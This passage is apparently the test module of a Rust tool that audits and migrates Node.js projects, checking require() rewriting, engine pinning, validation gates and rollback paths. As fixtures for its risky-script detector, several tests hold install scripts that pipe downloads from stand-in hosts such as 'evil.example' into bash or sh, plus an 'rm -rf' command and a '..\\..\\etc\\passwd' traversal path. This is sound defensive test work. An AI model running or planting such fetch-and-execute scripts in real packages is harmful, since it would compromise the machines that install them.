                .contains("const literal = \"require('fs')\";")
        );
        assert!(
            rewrite
                .rewritten_content
                .contains("// const fake = require('path');")
        );
    }

    #[test]
    fn rewrite_commonjs_requires_bails_on_computed_require() {
        let source = "const target = './plugin';\nconst plugin = require(target);\n";

        let rewrite = rewrite_commonjs_requires(source);

        assert_eq!(rewrite.rewrite_count, 0);
        assert_eq!(rewrite.rewritten_content, source);
        assert!(rewrite.manual_findings.iter().any(|finding| {
            finding.contains("dynamic or non-literal require() usage detected")
        }));
    }

    #[test]
    fn rewrite_commonjs_requires_bails_on_create_require() {
        let source = "const { createRequire } = require('module');\nconst localRequire = createRequire(import.meta.url);\nconst manifest = localRequire('./package.json');\n";

        let rewrite = rewrite_commonjs_requires(source);

        assert_eq!(rewrite.rewrite_count, 0);
        assert_eq!(rewrite.rewritten_content, source);
        assert!(
            rewrite
                .manual_findings
                .iter()
                .any(|finding| finding.contains("createRequire() usage detected"))
        );
    }

    #[test]
    fn rewrite_commonjs_requires_bails_on_multiline_parser_mismatch() {
        let source = "const fs = require(\n  'fs'\n);\n";

        let rewrite = rewrite_commonjs_requires(source);

        assert_eq!(rewrite.rewrite_count, 0);
        assert_eq!(rewrite.rewritten_content, source);
        assert!(rewrite
            .manual_findings
            .iter()
            .any(|finding| finding.contains("parser-backed CommonJS rewrite coverage mismatch")));
    }

    #[test]
    fn run_rewrite_flags_non_automatable_module_transforms() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let source = "import path from \"node:path\";\nconst loader = require(runtimeName);\nmodule.exports = loader(path);\n";

        write_hardened_manifest(project);
        write_project_file(project, "index.js", source);

        let report = run_rewrite(project, false).expect("dry-run source rewrite");

        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(report.rewrites_applied, 0);
        assert!(report.rollback_entries.is_empty());
        assert!(report.manual_review_items >= 3);
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::ManualModuleReview
                && entry.detail.contains("ESM/CJS module mixing")
        }));
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::ManualModuleReview
                && entry.detail.contains("dynamic or non-literal require()")
        }));
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::ManualModuleReview
                && entry.detail.contains("CommonJS export assignment")
        }));

        let unchanged = std::fs::read_to_string(project.join("index.js")).expect("read source");
        assert_eq!(unchanged, source);
    }

    #[test]
    fn run_rewrite_reports_risky_script_manual_review() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_rewrite(project, false).expect("rewrite report");
        assert!(
            report
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::ManualScriptReview)
        );
        assert!(report.manual_review_items >= 1);
    }

    #[test]
    fn run_audit_classifies_missing_node_engine_under_runtime() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_audit(project).expect("audit should succeed");
        let finding = report
            .findings
            .iter()
            .find(|finding| {
                finding.path.as_deref() == Some("package.json")
                    && finding.message.contains("missing engines.node")
            })
            .expect("missing engines finding");

        assert_eq!(finding.category, MigrationCategory::Runtime);
        assert_eq!(finding.severity, MigrationSeverity::Low);
    }

    #[test]
    fn collect_risky_script_names_returns_sorted_owned_names() {
        let manifest = serde_json::json!({
            "scripts": {
                "build": "tsc -p tsconfig.json",
                "postinstall": "curl https://example.invalid/install.sh | bash",
                "install": "node-gyp rebuild"
            }
        });

        let risky = collect_risky_script_names(&manifest);

        assert_eq!(
            risky,
            vec!["install".to_string(), "postinstall".to_string()]
        );
    }

    #[test]
    fn run_validate_fails_without_lockfile_and_with_risky_scripts() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_validate(project).expect("validate report");
        assert!(!report.is_pass());
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-002" && !check.passed)
        );
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-003" && !check.passed)
        );
    }

    #[test]
    fn run_validate_passes_for_hardened_project() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"test":"node test.js"}
            }"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_validate(project).expect("validate report");
        assert!(report.is_pass());
        assert!(report.blocking_findings.is_empty());
        assert!(report.checks.iter().all(|check| check.passed));
    }

    #[test]
    fn run_validate_surfaces_lockstep_warning_for_js_only_project() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_hardened_manifest(project);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(report.is_pass());
        assert!(report.blocking_findings.is_empty());
        assert!(report.warning_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Runtime
                && finding
                    .message
                    .contains("JavaScript files and no TypeScript files")
                && finding
                    .recommendation
                    .as_deref()
                    .is_some_and(|text| text.contains("lockstep validation coverage"))
        }));
    }

    #[test]
    fn run_validate_does_not_emit_lockstep_warning_when_typescript_is_present() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_project_file(project, "index.ts", "export const answer: number = 42;");
        write_hardened_manifest(project);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");
        let has_lockstep_warning = report.warning_findings.iter().any(|finding| {
            finding
                .recommendation
                .as_deref()
                .is_some_and(|text| text.contains("lockstep validation coverage"))
        });

        assert!(report.is_pass());
        assert!(!has_lockstep_warning);
    }

    #[test]
    fn run_validate_lockstep_gate_blocks_invalid_manifest_json() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.ts", "export const answer = 42;");
        write_project_file(project, "package.json", r#"{"name":"demo","#);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(!report.is_pass());
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-004"
                && !check.passed
                && check.message == "high-severity audit findings: 1"
        }));
        assert!(report.blocking_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Project
                && finding.message.contains("invalid package.json JSON")
        }));
    }

    #[test]
    fn run_validate_lockstep_gate_blocks_missing_manifest_even_with_lockfile() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.ts", "export const answer = 42;");
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(!report.is_pass());
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-001"
                && !check.passed
                && check.message == "package manifests detected: 0"
        }));
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-004"
                && !check.passed
                && check.message == "high-severity audit findings: 1"
        }));
        assert!(report.blocking_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Project
                && finding.message.contains("no package.json files found")
        }));
    }

    #[test]
    fn parse_audit_output_format_rejects_blank_value() {
        let err = AuditOutputFormat::parse(" \t\n ")
            .expect_err("blank audit output format must fail closed");

        assert!(err.contains("unsupported migrate audit format"));
        assert!(err.contains("json, text, sarif"));
    }

    #[test]
    fn parse_audit_output_format_rejects_shell_like_value() {
        let err = AuditOutputFormat::parse("json;unexpected")
            .expect_err("shell-like audit format must not be normalized");

        assert!(err.contains("json;unexpected"));
        assert!(err.contains("expected one of"));
    }

    #[test]
    fn parse_audit_output_format_rejects_path_like_suffix() {
        let err = AuditOutputFormat::parse("sarif.json")
            .expect_err("path-like audit format suffix must be rejected");

        assert!(err.contains("sarif.json"));
    }

    #[test]
    fn ensure_node_engine_pin_rejects_non_object_manifest() {
        let mut manifest = serde_json::json!(["not", "an", "object"]);

        assert!(!ensure_node_engine_pin(&mut manifest));
        assert_eq!(manifest, serde_json::json!(["not", "an", "object"]));
    }

    #[test]
    fn ensure_node_engine_pin_rejects_non_object_engines_field() {
        let mut manifest = serde_json::json!({
            "name": "demo",
            "engines": "node >=20",
        });

        assert!(!ensure_node_engine_pin(&mut manifest));
        assert_eq!(manifest["engines"], "node >=20");
        assert!(manifest.get("node").is_none());
    }

    #[test]
    fn collect_risky_script_names_ignores_non_string_commands() {
        let manifest = serde_json::json!({
            "scripts": {
                "postinstall": ["curl https://example.invalid/install.sh"],
                "install": {"cmd": "node-gyp rebuild"},
                "prepare": null,
            }
        });

        let risky = collect_risky_script_names(&manifest);

        assert!(risky.is_empty());
    }

    #[test]
    fn collect_risky_script_names_ignores_non_object_scripts_field() {
        let manifest = serde_json::json!({
            "scripts": "postinstall=curl https://example.invalid/install.sh",
        });

        let risky = collect_risky_script_names(&manifest);

        assert!(risky.is_empty());
    }

    #[test]
    fn is_risky_script_does_not_flag_near_miss_tokens() {
        assert!(!is_risky_script("build", "echo curling artifacts"));
        assert!(!is_risky_script("build", "echo wgettable cache"));
        assert!(!is_risky_script("build", "node scripts/install.js"));
    }

    #[test]
    fn run_audit_rejects_file_target_path() {
        let temp = tempfile::tempdir().expect("tempdir");
        let file_path = temp.path().join("package.json");
        std::fs::write(&file_path, "{}\n").expect("write file target");

        let err = run_audit(&file_path).expect_err("file target must not be audited as project");

        assert!(err.to_string().contains("target must be a directory"));
    }

    #[test]
    fn run_rewrite_rejects_missing_target_path() {
        let temp = tempfile::tempdir().expect("tempdir");
        let missing_path = temp.path().join("missing-project");

        let err = run_rewrite(&missing_path, false)
            .expect_err("missing rewrite target must fail before scanning");

        assert!(err.to_string().contains("target does not exist"));
    }

    #[test]
    fn negative_collect_project_files_with_unbounded_vec_push() {
        // Test potential memory exhaustion from unlimited Vec::push operations
        // Lines 616, 617, 638, 640 use Vec::push without push_bounded bounds checking
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create a deeply nested directory structure that could stress Vec operations
        let mut deep_path = project.to_path_buf();
        for i in 0..100 {
            deep_path = deep_path.join(format!("level-{:03}", i));
            std::fs::create_dir_all(&deep_path).expect("create deep dirs");

            // Add multiple files at each level to stress the files Vec
            for j in 0..10 {
                std::fs::write(
                    deep_path.join(format!("file-{:03}.js", j)),
                    "console.log('test');",
                )
                .expect("write deep file");
                std::fs::write(deep_path.join(format!("file-{:03}.json", j)), "{}")
                    .expect("write deep json");
            }
        }

        // This should succeed but demonstrates unlimited Vec growth potential
        let files = collect_project_files(project).expect("collect files");

        // Verify files were collected (demonstrating the Vec growth)
        assert!(
            files.len() > 1000,
            "Should collect many files from deep structure"
        );

        // All files should be valid paths
        for file_path in &files {
            assert!(file_path.exists(), "Collected path should exist");
            assert!(file_path.is_file(), "Collected path should be a file");
        }

        // The current implementation has no bounds on Vec::push operations
        // A hardened version might use push_bounded with MAX_FILES_PER_PROJECT
        // or implement early termination for excessively large projects
    }

    #[test]
    fn negative_migration_entry_id_generation_with_integer_overflow() {
        // Test ID generation arithmetic that could overflow
        // Line 412: format!("mig-rewrite-{:03}", index + 1) uses direct addition
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create a project that will generate many rewrite entries
        write_project_file(
            project,
            "package.json",
            r#"{
            "name": "overflow-test",
            "version": "1.0.0"
        }"#,
        );

        // This will generate at least one entry (missing node engine + no package manifests)
        let report = run_rewrite(project, false).expect("rewrite should succeed");

        // Verify entry IDs are generated correctly
        for (expected_index, entry) in report.entries.iter().enumerate() {
            let expected_id = format!("mig-rewrite-{:03}", expected_index.saturating_add(1));
            assert_eq!(
                entry.id, expected_id,
                "Entry ID should match expected format"
            );
        }

        // Test the edge case where arithmetic could theoretically overflow
        // If we had usize::MAX entries, index + 1 would overflow
        // The current implementation doesn't protect against this scenario

        // Simulate what would happen with high index values
        for test_index in [usize::MAX - 10, usize::MAX - 1] {
            // This would overflow if actually called with these values
            // format!("mig-rewrite-{:03}", test_index + 1) would panic on overflow

            // In a hardened implementation, this should use saturating_add:
            // let safe_id = test_index.saturating_add(1);

            // We can't actually test the overflow without causing a panic,
            // but this demonstrates the vulnerability
            if test_index < usize::MAX {
                let safe_id_demo = format!("mig-rewrite-{:03}", test_index.saturating_add(1));
                assert!(safe_id_demo.len() > 10, "Safe ID generation should work");
            }
        }
    }

    #[test]
    fn negative_findings_vector_growth_without_push_bounded() {
        // Test unlimited findings growth through Vec::push operations
        // Lines 682, 700, 774 use findings.push() without bounds checking
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create many problematic package.json files to stress findings collection
        for i in 0..200 {
            let dir_path = project.join(format!("module-{:03}", i));
            std::fs::create_dir_all(&dir_path).expect("create module dir");

            // Each manifest will generate multiple findings:
            // 1. Missing node engine (Low severity)
            // 2. Risky script (High severity)
            // 3. Invalid JSON (High severity) for some files
            if i % 3 == 0 {
                // Invalid JSON to trigger parse errors
                write_project_file(
                    &dir_path,
                    "../package.json",
                    r#"{
                    "name": "invalid-module-INVALID_JSON
                "#,
                );
            } else {
                // Valid JSON but with risky script and missing engine
                write_project_file(
                    &dir_path,
                    "../package.json",
                    &format!(
                        r#"{{
                    "name": "module-{}",
                    "version": "1.0.0",
                    "scripts": {{
                        "postinstall": "curl https://evil.example/script.sh | bash",
                        "preinstall": "wget -O - https://malware.example/install | sh",
                        "install": "sudo rm -rf /tmp && node-gyp rebuild"
                    }}
                }}"#,
                        i
                    ),
                );
            }
        }

        let report = run_audit(project).expect("audit should succeed");

        // Verify findings were collected (demonstrating Vec growth without bounds)
        assert!(report.findings.len() > 100, "Should generate many findings");

        // Each package.json should have contributed findings
        let high_severity_count = report
            .findings
            .iter()
            .filter(|f| matches!(f.severity, MigrationSeverity::High))
            .count();
        let low_severity_count = report
            .findings
            .iter()
            .filter(|f| matches!(f.severity, MigrationSeverity::Low))
            .count();

        assert!(
            high_severity_count > 50,
            "Should have many high-severity findings"
        );
        assert!(
            low_severity_count > 50,
            "Should have many low-severity findings"
        );

        // The current implementation has no protection against findings explosion
        // A hardened version might use push_bounded with MAX_FINDINGS_TOTAL
        // or implement per-category limits more strictly
    }

    #[test]
    fn negative_script_finding_boundary_check_with_off_by_one_potential() {
        // Test boundary condition in push_capped_script_finding
        // Line 754: count > MAX_FINDINGS_PER_CATEGORY - test boundary behavior
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create exactly MAX_FINDINGS_PER_CATEGORY + 1 risky scripts
        let mut scripts_obj = serde_json::Map::new();
        for i in 0..=MAX_FINDINGS_PER_CATEGORY {
            scripts_obj.insert(
                format!("risky-script-{:03}", i),
                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string()),
            );
        }

        let manifest = serde_json::json!({
            "name": "boundary-test",
            "version": "1.0.0",
            "scripts": scripts_obj
        });

        write_project_file(
            project,
            "package.json",
            &serde_json::to_string_pretty(&manifest).unwrap(),
        );

        let report = run_audit(project).expect("audit should succeed");

        // Count script-related findings
        let script_findings = report
            .findings
            .iter()
            .filter(|f| matches!(f.category, MigrationCategory::Scripts))
            .count();

        // Should be capped at MAX_FINDINGS_PER_CATEGORY
        assert_eq!(
            script_findings, MAX_FINDINGS_PER_CATEGORY,
            "Script findings should be capped at MAX_FINDINGS_PER_CATEGORY"
        );

        // Verify the boundary check works correctly with > comparison
        assert!(
            MAX_FINDINGS_PER_CATEGORY + 1 > MAX_FINDINGS_PER_CATEGORY,
            "Boundary check should use > not >= for correct capping"
        );

        // Test with exactly MAX_FINDINGS_PER_CATEGORY scripts (should all be included)
        let temp2 = tempfile::tempdir().expect("tempdir2");
        let project2 = temp2.path();

        let mut exact_scripts_obj = serde_json::Map::new();
        for i in 0..MAX_FINDINGS_PER_CATEGORY {
            exact_scripts_obj.insert(
                format!("risky-script-{:03}", i),
                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string()),
            );
        }

        let exact_manifest = serde_json::json!({
            "name": "exact-boundary-test",
            "version": "1.0.0",
            "scripts": exact_scripts_obj
        });

        write_project_file(
            project2,
            "package.json",
            &serde_json::to_string_pretty(&exact_manifest).unwrap(),
        );

        let exact_report = run_audit(project2).expect("audit should succeed");
        let exact_script_findings = exact_report
            .findings
            .iter()
            .filter(|f| matches!(f.category, MigrationCategory::Scripts))
            .count();

        // All MAX_FINDINGS_PER_CATEGORY scripts should be reported
        assert_eq!(
            exact_script_findings, MAX_FINDINGS_PER_CATEGORY,
            "Exactly MAX_FINDINGS_PER_CATEGORY scripts should all be reported"
        );
    }

    #[test]
    fn negative_rollback_entry_count_length_casting_vulnerability() {
        // Test potential unsafe length casting in rollback entry counting
        // Line 436: report.rollback_entries.len() could be cast unsafely elsewhere
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create many package.json files that need rewriting
        for i in 0..1000 {
            let module_dir = project.join(format!("module-{:04}", i));
            std::fs::create_dir_all(&module_dir).expect("create module dir");

            // Package without node engine - will need rewriting
            write_project_file(
                &module_dir,
                "../package.json",
                &format!(
                    r#"{{
                "name": "module-{}",
                "version": "1.0.0",
                "description": "Test module without node engine pin"
            }}"#,
                    i
                ),
            );
        }

        let report = run_rewrite(project, false).expect("rewrite should succeed");
        let rollback_plan = build_rollback_plan(&report);

        // Verify high entry count
        assert!(
            rollback_plan.entry_count > 500,
            "Should have many rollback entries"
        );
        assert_eq!(
            rollback_plan.entry_count,
            rollback_plan.entries.len(),
            "Entry count should match entries vector length"
        );

        // Test potential casting issues
        let entry_count_as_u32 = rollback_plan.entry_count as u32;
        assert_eq!(
            entry_count_as_u32 as usize, rollback_plan.entry_count,
            "Casting to u32 and back should preserve value for reasonable counts"
        );

        // Test with usize values that would overflow u32
        if rollback_plan.entry_count < u32::MAX as usize {
            // Safe cast
            let safe_u32 = u32::try_from(rollback_plan.entry_count)
                .expect("Should convert safely when within u32 range");
            assert_eq!(safe_u32 as usize, rollback_plan.entry_count);
        }

        // Demonstrate the vulnerability pattern:
        // let unsafe_cast = rollback_plan.entry_count as u32; // Could overflow
        // Better: let safe_cast = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);

        let safe_cast_demo = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);
        assert!(
            safe_cast_demo > 0,
            "Safe cast should preserve non-zero values"
        );
    }

    #[test]
    #[cfg(unix)]
    fn signal_runtime_smoke_process_group_fails_with_invalid_pid() {
        // Test that signal_runtime_smoke_process_group returns error for invalid process group
        let result = signal_runtime_smoke_process_group(0, "-TERM");

        assert!(
            result.is_err(),
            "Signaling invalid process group should return error"
        );

        let error = result.unwrap_err();
        assert!(
            error.to_string().contains("kill command failed"),
            "Error should mention kill command failure: {}",
            error
        );
    }

    #[test]
    #[cfg(unix)]
    fn terminate_runtime_smoke_process_group_propagates_signal_errors() {
        // Test that terminate_runtime_smoke_process_group propagates signal errors
        let result = terminate_runtime_smoke_process_group(0);

        assert!(
            result.is_err(),
            "Terminating invalid process group should return error"
        );

        let error = result.unwrap_err();
        assert!(
            error.to_string().contains("kill command failed"),
            "Error should mention kill command failure: {}",
            error
        );
    }

    #[test]
    fn terminate_runtime_smoke_process_tree_error_propagation_pattern() {
        // Test that the error propagation follows the expected pattern
        // We can't easily mock Child::kill()/wait() failures, but we can test the error structure

        use std::process::{Command, Stdio};
        use std::thread;
        use std::time::Duration;

        // Start a process that will exit quickly
        let mut child = Command::new("true")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .expect("Failed to spawn test process");

        // Wait for process to exit
        thread::sleep(Duration::from_millis(100));

        // Now try to terminate an already-dead process - this should succeed
        // since kill() on a dead process typically succeeds
        let result = terminate_runtime_smoke_process_tree(&mut child);

        // The result pattern should be a Result type that can be checked
        match result {
            Ok(()) => {
                // Expected for already-dead process
            }
            Err(err) => {
                // If there's an error, it should contain meaningful context
                let error_msg = err.to_string();
                assert!(
                    error_msg.contains("failed to kill") || error_msg.contains("failed to wait"),
                    "Error should contain context about kill or wait failure: {}",
                    error_msg
                );
            }
        }
    }

    #[test]
    fn bd_3uajr_regression_rollback_path_has_unsafe_separator() {
        // Regression test for bd-3uajr: ensure rollback_path_has_unsafe_separator function
        // properly detects backslash separators in rollback paths (commit 3066d7f3, bd-wdjiw)

        // Should detect backslash in simple path
        assert!(rollback_path_has_unsafe_separator("src\\file.js"));

        // Should detect backslash in nested path
        assert!(rollback_path_has_unsafe_separator("src\\components\\App.tsx"));

        // Should detect backslash in parent traversal attempts
        assert!(rollback_path_has_unsafe_separator("..\\..\\etc\\passwd"));

        // Should detect backslash mixed with forward slashes
        assert!(rollback_path_has_unsafe_separator("src/utils\\helper.js"));

        // Should NOT flag safe paths with forward slashes
        assert!(!rollback_path_has_unsafe_separator("src/file.js"));
        assert!(!rollback_path_has_unsafe_separator("src/components/App.tsx"));
        assert!(!rollback_path_has_unsafe_separator("../parent/file.js"));

        // Should NOT flag empty or single character paths
        assert!(!rollback_path_has_unsafe_separator(""));
        assert!(!rollback_path_has_unsafe_separator("a"));
        assert!(!rollback_path_has_unsafe_separator("/"));
    }
}
